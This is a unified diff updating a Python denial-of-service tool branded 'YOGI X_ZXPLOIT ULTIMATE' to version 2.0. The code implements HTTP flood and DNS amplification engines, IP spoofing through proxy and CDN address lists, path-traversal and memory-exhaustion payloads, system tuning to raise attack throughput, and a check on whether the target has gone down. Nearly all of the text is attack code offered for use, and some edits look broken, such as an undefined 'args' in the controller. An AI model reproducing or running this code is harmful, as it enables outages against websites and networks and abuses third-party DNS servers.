@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# YOGI X_ZXPLOIT ULTIMATE - Project Armageddon Pro Max Ultra+ (True Ghost Edition) v1.0
+# YOGI X_ZXPLOIT ULTIMATE - Project Armageddon Pro Max Ultra+ (True Ghost Edition) v2.0
 # PERINGATAN: Dilarang keras menyalahgunakan tools!!
 
 import os
@@ -74,7 +74,7 @@ def print_banner():
    ██║   ╚██████╔╝╚██████╔╝╚███╔███╔╝██╔╝ ██╗      ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
    ╚╝    ╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝      ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
 """
-    subtitle = "❰𝕌𝕃𝕀𝕄𝔸𝕋𝔼 𝕐𝕆𝔾𝕀 𝔻𝔻𝕆𝕊 𝔽𝕆ℝ𝔼ℕ𝕊𝕀ℂ 𝕊𝕐𝕊𝕋𝔼𝕄❱ (TRUE GHOST MODE)"
+    subtitle = "❰𝕌𝕃𝕀𝕄𝔸𝕋𝔼 𝕐𝕆𝔾𝕀 𝔻𝔻𝕆𝕊 𝔽𝕆ℝ𝔼ℕ𝕊𝕀ℂ 𝕊𝕐𝕊𝕋𝔼𝕄❱ (TRUE GHOST MODE) v2.0"
     warning = "𝙎𝙐𝘽𝙎𝘾𝙍𝙄𝘽𝙀 𝙈𝙔 𝙔𝙊𝙐𝙏𝙐𝘽𝙀:𝙝𝙩𝙩𝙥𝙨://𝙮𝙤𝙪𝙩𝙪𝙗𝙚.𝙘𝙤𝙢/@𝙯𝙭_𝙥-𝙡𝙤𝙞𝙩"
     website = "https://yogistore-shopcommyidvercelapp.vercel.app"
     
@@ -154,21 +154,20 @@ class ResourceManager:
         settings = {
             'max_bots': 20000000 if self.ram >= 8*1024**3 else 10000000,
             'ip_pool_size': 2000000,  # 2 million IPs
-            'socket_pool_size': 30,
-            'thread_workers': min(24, self.threads * 3),
-            'request_per_conn': 1000,
-            'chunk_size': 1024 * 128,  # 128KB
-            'max_payload': 1024 * 1024,  # 1MB
-            'quantum_states': 2048
+            'socket_timeout': 2.0,    # Increased timeout
+            'thread_workers': min(24, self.threads * 2),  # Reduced threads
+            'request_per_conn': 100,
+            'chunk_size': 1024 * 64,  # 64KB
+            'max_payload': 1024 * 512,  # 512KB
+            'quantum_states': 1024
         }
         
         # Adjust based on available RAM
         if self.ram < 6*1024**3:  # <6GB RAM
             settings['ip_pool_size'] = 1000000
-            settings['socket_pool_size'] = 20
-            settings['request_per_conn'] = 500
+            settings['request_per_conn'] = 50
             settings['max_bots'] = 5000000
-            settings['quantum_states'] = 1024
+            settings['quantum_states'] = 512
             
         return settings
         
@@ -179,21 +178,19 @@ class ResourceManager:
             if platform.system() == "Linux":
                 optimizations = [
                     "sysctl -w net.ipv4.tcp_tw_reuse=1",
-                    "sysctl -w net.core.somaxconn=500000",
-                    "sysctl -w net.ipv4.tcp_max_syn_backlog=500000",
+                    "sysctl -w net.core.somaxconn=100000",
+                    "sysctl -w net.ipv4.tcp_max_syn_backlog=100000",
                     "sysctl -w net.ipv4.ip_local_port_range='1024 65535'",
-                    "sysctl -w net.ipv4.tcp_fin_timeout=5",
-                    "sysctl -w net.ipv4.tcp_syn_retries=1",
-                    "sysctl -w net.ipv4.tcp_synack_retries=1",
-                    "sysctl -w net.ipv4.tcp_abort_on_overflow=1",
-                    "sysctl -w net.ipv4.tcp_timestamps=0",
-                    "sysctl -w net.core.netdev_max_backlog=500000",
-                    "sysctl -w net.ipv4.tcp_rmem='8192 87380 33554432'",
-                    "sysctl -w net.ipv4.tcp_wmem='8192 131072 33554432'",
+                    "sysctl -w net.ipv4.tcp_fin_timeout=15",
+                    "sysctl -w net.ipv4.tcp_syn_retries=3",
+                    "sysctl -w net.ipv4.tcp_synack_retries=3",
+                    "sysctl -w net.core.netdev_max_backlog=100000",
+                    "sysctl -w net.ipv4.tcp_rmem='4096 87380 33554432'",
+                    "sysctl -w net.ipv4.tcp_wmem='4096 65536 33554432'",
                     "sysctl -w net.ipv4.udp_mem='6291456 8388608 33554432'",
-                    "sysctl -w vm.swappiness=5",
-                    "sysctl -w vm.dirty_ratio=5",
-                    "sysctl -w vm.dirty_background_ratio=3",
+                    "sysctl -w vm.swappiness=10",
+                    "sysctl -w vm.dirty_ratio=10",
+                    "sysctl -w vm.dirty_background_ratio=5",
                     "echo performance | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor",
                     "sysctl -w net.ipv4.tcp_congestion_control=bbr",
                     "sysctl -w net.core.default_qdisc=fq"
@@ -205,7 +202,7 @@ class ResourceManager:
             # Windows optimization
             elif platform.system() == "Windows":
                 optimizations = [
-                    "netsh int tcp set global autotuninglevel=restricted",
+                    "netsh int tcp set global autotuninglevel=normal",
                     "netsh int tcp set global chimney=enabled",
                     "netsh int tcp set global dca=enabled",
                     "netsh int tcp set global ecncapability=enabled",
@@ -222,14 +219,14 @@ class ResourceManager:
             # Set file descriptor limits
             if hasattr(os, 'setrlimit'):
                 try:
-                    os.setrlimit(os.RLIMIT_NOFILE, (9999999, 9999999))
+                    os.setrlimit(os.RLIMIT_NOFILE, (100000, 100000))
                 except:
                     pass
             
             # Set process priority
             if hasattr(os, 'nice'):
                 try:
-                    os.nice(-20)
+                    os.nice(-10)
                 except:
                     pass
             elif platform.system() == "Windows":
@@ -237,7 +234,7 @@ class ResourceManager:
                     import win32api, win32process, win32con
                     pid = win32api.GetCurrentProcessId()
                     handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, pid)
-                    win32process.SetPriorityClass(handle, win32process.REALTIME_PRIORITY_CLASS)
+                    win32process.SetPriorityClass(handle, win32process.HIGH_PRIORITY_CLASS)
                 except:
                     pass
             
@@ -421,7 +418,6 @@ class GhostIPSpoofer:
                 pass
         
         print(f"{Color.YELLOW}[!] Loading proxies...{Color.END}")
-        proxies = []
         try:
             # Public proxy sources
             sources = [
@@ -473,6 +469,16 @@ class GhostIPSpoofer:
             # Cloudflare
             response = requests.get('https://www.cloudflare.com/ips-v4', timeout=5)
             cdn_ranges.extend(response.text.strip().split('\n'))
+            
+            # AWS
+            response = requests.get('https://ip-ranges.amazonaws.com/ip-ranges.json', timeout=5)
+            aws_data = response.json()
+            cdn_ranges.extend([item['ip_prefix'] for item in aws_data['prefixes'] if item['service'] == 'CLOUDFRONT'])
+            
+            # Google Cloud
+            response = requests.get('https://www.gstatic.com/ipranges/cloud.json', timeout=5)
+            gcp_data = response.json()
+            cdn_ranges.extend([item['ipv4Prefix'] for item in gcp_data['prefixes'] if 'ipv4Prefix' in item])
             
             print(f"{Color.GREEN}[✓] Loaded {len(cdn_ranges)} CDN ranges{Color.END}")
             
@@ -655,7 +661,7 @@ class GhostEvasion:
             # Path Traversal
             '../../' * 50 + 'etc/passwd\0',
             # Memory Exhaustion
-            'x' * (1024 * 1024),  # 1MB payload
+            'x' * (1024 * 512),  # 512KB payload
             # Log Injection
             'x' * 1000 + '\n' * 5000
         ]
@@ -804,27 +810,32 @@ class GhostAttackEngine:
         self.evasion = GhostEvasion(target)
         self.resource_mgr = ResourceManager()
         self.target_ip = self.resolve_target()
-        self.socket_pool = []
-        self.create_socket_pool(self.resource_mgr.optimal_settings['socket_pool_size'])
+        self.socket_timeout = self.resource_mgr.optimal_settings['socket_timeout']
         
-        # Attack configuration
-        self.attack_power = 1000 if permanent_mode else (800 if hyper_mode else 600)
-        stats.attack_power = self.attack_power
-
     def resolve_target(self):
         """Resolve domain to IP if needed"""
         if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", self.target):
             return self.target
+        
         try:
-            return socket.gethostbyname(self.target)
+            # Use multiple DNS resolvers
+            resolvers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
+            resolver = dns.resolver.Resolver()
+            resolver.nameservers = resolvers
+            answer = resolver.resolve(self.target, 'A')
+            return str(answer[0])
         except:
-            return self.target
+            try:
+                return socket.gethostbyname(self.target)
+            except:
+                print(f"{Color.RED}[-] Failed to resolve {self.target}{Color.END}")
+                return None
 
     def create_socket(self):
         """Create socket with optimal settings"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.03 if self.hyper_mode else 0.05)  # Shorter timeout
+            sock.settimeout(self.socket_timeout)
             
             # Optimize socket for performance
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -840,30 +851,12 @@ class GhostAttackEngine:
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 context.set_ciphers('ALL:@SECLEVEL=0')
-                context.minimum_version = ssl.TLSVersion.TLSv1_2
                 sock = context.wrap_socket(sock, server_hostname=self.target)
             
             return sock
-        except:
+        except Exception as e:
+            print(f"{Color.RED}[-] Socket creation failed: {str(e)}{Color.END}")
             return None
-
-    def create_socket_pool(self, size):
-        """Create socket pool for reuse"""
-        for _ in range(size):
-            sock = self.create_socket()
-            if sock:
-                self.socket_pool.append(sock)
-
-    def get_socket(self):
-        """Get socket from pool"""
-        if self.socket_pool:
-            return self.socket_pool.pop()
-        return self.create_socket()
-
-    def release_socket(self, sock):
-        """Return socket to pool"""
-        if sock:
-            self.socket_pool.append(sock)
 
     def http_flood(self):
         """Advanced HTTP flood with CPU exhaustion payload"""
@@ -871,10 +864,9 @@ class GhostAttackEngine:
         bytes_sent = 0
         success = False
         damage = 0
-        sock = None
         
         try:
-            sock = self.get_socket()
+            sock = self.create_socket()
             if not sock:
                 return 0, 0, 0, False, 0
                 
@@ -882,16 +874,15 @@ class GhostAttackEngine:
             try:
                 sock.connect((self.target_ip, self.port))
             except Exception as e:
-                self.release_socket(sock)
                 return 0, 0, 0, False, 0
             
             # Number of requests per connection
-            req_count = self.resource_mgr.optimal_settings['request_per_conn'] // 10
+            req_count = self.resource_mgr.optimal_settings['request_per_conn']
             
             for _ in range(req_count):
                 # Build HTTP request
-                method = random.choice(["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"])
-                path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,20)))
+                method = random.choice(["GET", "POST"])
+                path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5,12)))
                 
                 headers = [
                     f"{method} {path} HTTP/1.1",
@@ -906,45 +897,17 @@ class GhostAttackEngine:
                     f"Referer: {self.evasion.get_referer()}",
                     f"Cookie: {self.evasion.get_cookie()}",
                     f"Upgrade-Insecure-Requests: 1",
-                    f"TE: trailers"
+                    f"\r\n"
                 ]
                 
-                # HTTP/2 Pseudo-Headers
-                if self.http2_mode:
-                    headers.extend([
-                        f":method: {method}",
-                        f":path: {path}",
-                        f":authority: {self.target}",
-                        f":scheme: {'https' if self.use_ssl else 'http'}"
-                    ])
-                
-                # Add CPU exhaustion payload in permanent mode
-                if self.permanent_mode and random.random() > 0.3:
-                    payload = self.evasion.get_malicious_payload()
-                    headers.append(f"X-Payload: {payload[:2000]}")  # Send partial payload in header
-                    damage += 0.1
-                
-                # For POST/PUT requests
-                if method in ["POST", "PUT", "PATCH"]:
-                    if self.slow_post:
-                        # Slow Post Attack
-                        headers.append(f"Content-Type: multipart/form-data; boundary=----WebKitFormBoundary")
-                        headers.append(f"Content-Length: 999999999")
-                        full_payload = "\r\n".join(headers) + "\r\n\r\n"
-                        damage += 0.5
-                    elif self.permanent_mode and random.random() > 0.5:
-                        data = self.evasion.get_malicious_payload()[:5000]
-                        headers.append(f"Content-Type: application/x-www-form-urlencoded")
-                        headers.append(f"Content-Length: {len(data)}")
-                        full_payload = "\r\n".join(headers) + "\r\n\r\n" + data
-                        damage += 0.3
-                    else:
-                        data = f"data={os.urandom(512).hex()}"  # Smaller payload
-                        headers.append(f"Content-Type: application/x-www-form-urlencoded")
-                        headers.append(f"Content-Length: {len(data)}")
-                        full_payload = "\r\n".join(headers) + "\r\n\r\n" + data
+                # For POST requests
+                if method == "POST":
+                    data = f"data={os.urandom(128).hex()}"
+                    content_header = f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(data)}"
+                    headers.insert(-1, content_header)
+                    full_payload = "\r\n".join(headers) + data
                 else:
-                    full_payload = "\r\n".join(headers) + "\r\n\r\n"
+                    full_payload = "\r\n".join(headers)
                 
                 # Send request
                 try:
@@ -952,24 +915,31 @@ class GhostAttackEngine:
                     bytes_sent += len(full_payload)
                     requests_sent += 1
                     success = True
-                except:
+                    
+                    # Small delay between requests
+                    time.sleep(0.01)
+                    
+                except Exception as e:
                     break
                 
-                # Additional junk packets to waste resources
-                if self.permanent_mode and random.random() > 0.4:
-                    junk_size = random.randint(512, 4096)  # Smaller junk
-                    junk = os.urandom(junk_size)
+                # Additional payload in permanent mode
+                if self.permanent_mode and random.random() > 0.7:
+                    payload = self.evasion.get_malicious_payload()
                     try:
-                        sock.sendall(junk)
-                        bytes_sent += junk_size
-                        damage += 0.05
+                        sock.sendall(payload[:1024].encode())
+                        bytes_sent += 1024
+                        damage += 0.1
                     except:
                         break
-        except:
+        except Exception as e:
             pass
         finally:
-            if sock:
-                self.release_socket(sock)
+            try:
+                if sock:
+                    sock.close()
+            except:
+                pass
+                
         return requests_sent, 0, bytes_sent, success, damage
 
     def dns_amplification_attack(self):
@@ -991,25 +961,23 @@ class GhostAttackEngine:
             query = dns.message.make_query(domain, dns.rdatatype.ANY)
             dns_data = query.to_wire()
             
-            # Send 100 packets per call
-            for _ in range(100):
+            # Send packets
+            for _ in range(50):  # Reduce packet count
                 dns_server = random.choice(dns_servers)
-                src_ip = self.spoofer.generate_ghost_ip()
                 
                 # Build UDP socket
                 with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-                    sock.settimeout(0.01)
-                    sock.bind(('0.0.0.0', random.randint(1024, 65535)))
+                    sock.settimeout(0.5)
                     
                     # Send to DNS server
                     try:
                         sock.sendto(dns_data, (dns_server, 53))
                         packets_sent += 1
                         bytes_sent += len(dns_data)
+                        success = True
                     except:
                         continue
             
-            success = True
         except:
             pass
         
@@ -1034,14 +1002,14 @@ class GhostController:
         self.attack_type = attack_type
         self.duration = duration
         self.bot_count = bot_count
-        self.use_ssl = use_ssl
-        self.cf_bypass = cf_bypass
-        self.hyper_mode = hyper_mode
-        self.permanent_mode = permanent_mode
-        self.http2_mode = http2_mode
-        self.dns_amplify = dns_amplify
-        self.slow_post = slow_post
-        self.ghost_mode = ghost_mode
+        self.use_ssl = args.ssl
+        self.cf_bypass = args.cf_bypass
+        self.hyper_mode = args.hyper
+        self.permanent_mode = args.permanent
+        self.http2_mode = args.http2_mode
+        self.dns_amplify = args.dns_amplify
+        self.slow_post = args.slow_post
+        self.ghost_mode = args.ghost_mode
         self.stats = GhostStats()
         self.running = True
         self.executor = None
@@ -1053,13 +1021,6 @@ class GhostController:
         self.stats.targets = self.resolved_targets
         self.target_status = "UNKNOWN"
         self.resource_mgr.apply_system_optimization()
-        self.attack_engines = [
-            GhostAttackEngine(
-                target, port, attack_type, self.stats,
-                use_ssl, cf_bypass, hyper_mode, permanent_mode,
-                http2_mode, dns_amplify, slow_post, ghost_mode
-            ) for target in self.resolved_targets
-        ]
 
     def resolve_targets(self):
         """Resolve all targets in list"""
@@ -1069,9 +1030,17 @@ class GhostController:
                 if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", target):
                     resolved.append(target)
                 else:
-                    resolved.append(socket.gethostbyname(target))
+                    # Use multiple DNS resolvers
+                    resolvers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
+                    resolver = dns.resolver.Resolver()
+                    resolver.nameservers = resolvers
+                    answer = resolver.resolve(target, 'A')
+                    resolved.append(str(answer[0]))
             except:
-                print(f"{Color.RED}[-] Failed to resolve {target}{Color.END}")
+                try:
+                    resolved.append(socket.gethostbyname(target))
+                except:
+                    print(f"{Color.RED}[-] Failed to resolve {target}{Color.END}")
         return resolved
 
     def start_attack(self):
@@ -1080,16 +1049,27 @@ class GhostController:
         print(f"{Color.YELLOW}[!] Estimated attack power: {self.stats.attack_power}%{Color.END}")
         
         # Setup thread pool
-        self.executor = ThreadPoolExecutor(max_workers=self.resource_mgr.optimal_settings['thread_workers'])
+        max_workers = self.resource_mgr.optimal_settings['thread_workers']
+        self.executor = ThreadPoolExecutor(max_workers=max_workers)
         self.stats.start_time = time.time()
         
         # Main attack loop
         start_time = time.time()
+        last_status_check = start_time
+        
         try:
             while time.time() - start_time < self.duration and self.running:
                 futures = []
-                for _ in range(min(1000, self.bot_count // 100)):  # Group in batches
-                    engine = random.choice(self.attack_engines)
+                
+                # Create attack engines for this batch
+                batch_size = min(500, self.bot_count // 10)
+                for _ in range(batch_size):
+                    target = random.choice(self.resolved_targets)
+                    engine = GhostAttackEngine(
+                        target, self.port, self.attack_type, self.stats,
+                        self.use_ssl, self.cf_bypass, self.hyper_mode, self.permanent_mode,
+                        self.http2_mode, self.dns_amplify, self.slow_post, self.ghost_mode
+                    )
                     futures.append(self.executor.submit(engine.execute_attack))
                 
                 # Process results
@@ -1098,15 +1078,22 @@ class GhostController:
                         requests, packets, bytes_sent, success, damage = future.result()
                         self.stats.update(requests, packets, bytes_sent, success, damage)
                         self.stats.ghost_ips_generated += requests
-                    except:
-                        pass
+                    except Exception as e:
+                        self.stats.errors += 1
                 
                 # Update stats
                 self.stats.active_threads = threading.active_count()
+                
+                # Check target status periodically
+                if time.time() - last_status_check > 10:
+                    self.check_target_status()
+                    last_status_check = time.time()
+                
+                # Display stats
                 os.system('clear' if os.name == 'posix' else 'cls')
                 print(self.stats.formatted_stats())
                 
-                # Check for Ctrl+C
+                # Check for stop command
                 try:
                     if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                         line = input()
@@ -1114,12 +1101,30 @@ class GhostController:
                             self.running = False
                 except:
                     pass
+                
+                # Adaptive throttling
+                time.sleep(0.1)
+                
         except KeyboardInterrupt:
             print(f"{Color.YELLOW}[!] Stopping attack...{Color.END}")
             self.running = False
+        except Exception as e:
+            print(f"{Color.RED}[-] Critical error: {str(e)}{Color.END}")
         
         # Cleanup
         self.stop_attack()
+
+    def check_target_status(self):
+        """Check if target is still responding"""
+        try:
+            target = random.choice(self.resolved_targets)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            result = sock.connect_ex((target, self.port))
+            self.stats.target_status = "DOWN" if result != 0 else "UP"
+            sock.close()
+        except:
+            self.stats.target_status = "UNKNOWN"
 
     def stop_attack(self):
         """Stop attack and clean up resources"""
@@ -1235,7 +1240,7 @@ def main():
         show_examples()
         return
     elif args.version:
-        print(f"{Color.BOLD}{Color.PURPLE}YOGI X ATTACK SYSTEM - Project Armageddon Pro Max Ultra+ (True Ghost Edition){Color.END}")
+        print(f"{Color.BOLD}{Color.PURPLE}YOGI X ATTACK SYSTEM - Project Armageddon Pro Max Ultra+ (True Ghost Edition) v2.0{Color.END}")
         return
     
     # Validate required parameters
@@ -1302,27 +1307,26 @@ def main():
         return
     
     # Launch attack
-    controller = GhostController(
-        target_list=target_list,
-        port=args.port,
-        attack_type=args.attack,
-        duration=args.duration,
-        bot_count=args.bots,
-        use_ssl=args.ssl,
-        cf_bypass=args.cf_bypass,
-        hyper_mode=args.hyper,
-        permanent_mode=args.permanent,
-        dns_amplify=args.dns_amplify,
-        slow_post=False,  # Disabled for stability
-        ghost_mode=args.ghost_mode
-    )
-    
     try:
+        controller = GhostController(
+            target_list=target_list,
+            port=args.port,
+            attack_type=args.attack,
+            duration=args.duration,
+            bot_count=args.bots,
+            use_ssl=args.ssl,
+            cf_bypass=args.cf_bypass,
+            hyper_mode=args.hyper,
+            permanent_mode=args.permanent,
+            http2_mode=False,
+            dns_amplify=args.dns_amplify,
+            slow_post=False,
+            ghost_mode=args.ghost_mode
+        )
+        
         controller.start_attack()
     except Exception as e:
         print(f"{Color.RED}[-] Critical error: {str(e)}{Color.END}")
-    finally:
-        controller.running = False
 
 if __name__ == "__main__":
     main()
